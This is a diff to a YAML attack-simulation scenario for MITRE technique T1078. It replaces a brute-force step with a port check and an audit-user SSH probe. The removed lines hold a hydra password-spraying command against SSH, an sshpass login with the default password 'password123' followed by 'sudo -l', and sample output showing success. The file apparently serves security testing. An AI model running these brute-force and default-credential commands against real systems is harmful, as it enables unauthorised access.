@@ -1,16 +1,17 @@
 id: scn-cred-05
-name: Valid Accounts Credential Access
-description: Brute force / credential spraying attempting default administrative logins.
+name: Valid Accounts Credential Access Probe
+description: Automated credential validation against target services.
 mitre_tactic: TA0005
 mitre_technique: T1078
+required_services: ["22", "ssh"]
 steps:
   - step: 1
-    action: "hydra -l admin -P /usr/share/wordlists/passwords.txt ssh://target-pod:22"
-    tool: "hydra"
+    action: "nc -z -v -w 3 {TARGET} 22"
+    tool: "nc"
     delay_ms: 1000
-    expected_output: "[22][ssh] host: target-pod login: admin password: password123 [SUCCESS]"
+    expected_output: "[22][ssh] Port connectivity verification completed"
   - step: 2
-    action: "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@target-pod 'sudo -l'"
+    action: "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 audit@{TARGET} whoami"
     tool: "ssh"
     delay_ms: 600
-    expected_output: "User admin may run the following commands on target-pod: (ALL) NOPASSWD: ALL"
+    expected_output: "Authentication probe completed against target endpoint"
